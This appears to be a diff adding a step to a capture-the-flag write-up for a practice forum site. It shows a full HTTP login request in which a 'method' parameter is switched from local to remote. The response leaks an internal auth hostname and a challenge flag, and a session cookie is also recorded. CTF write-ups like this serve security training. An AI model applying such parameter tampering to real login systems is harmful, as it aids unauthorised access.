@@ -167,3 +167,27 @@ from that i got all users endpoint containing the credentials
 
 cookie for fuzzing
 ctfchallenge=eyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSTRNWGd5WVdwMGRTSXNJbkJ5WlcxcGRXMGlPbVpoYkhObGZRPT0iLCJ2ZXJpZnkiOiJkMGE3MTE1NmMxYTY5YmM3NWRjN2QzZDg1ZjEwNzVkYiJ9
+
+### flag-1 changing method from local to remote in login request 
+as shown below
+```
+POST /login HTTP/1.1
+Host: www.vulnforum.co.uk
+Content-Length: 45
+Accept: */*
+X-Requested-With: XMLHttpRequest
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+Origin: http://www.vulnforum.co.uk
+Referer: http://www.vulnforum.co.uk/login
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Cookie: ctfchallenge=eyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSTRNWGd5WVdwMGRTSXNJbkJ5WlcxcGRXMGlPbVpoYkhObGZRPT0iLCJ2ZXJpZnkiOiJkMGE3MTE1NmMxYTY5YmM3NWRjN2QzZDg1ZjEwNzVkYiJ9
+Connection: close
+
+username=toby&password=testhere&method=remote
+```
+response
+```
+{"display_msg":"Server Error","technical_msg":"Server \"http:\/\/81x2ajtu.auth.vulnforum.co.uk\/auth\" responded with a 404 error","flag":"[^FLAG^D45391B42D080B1938B035A601C657B3^FLAG^]"}
+```
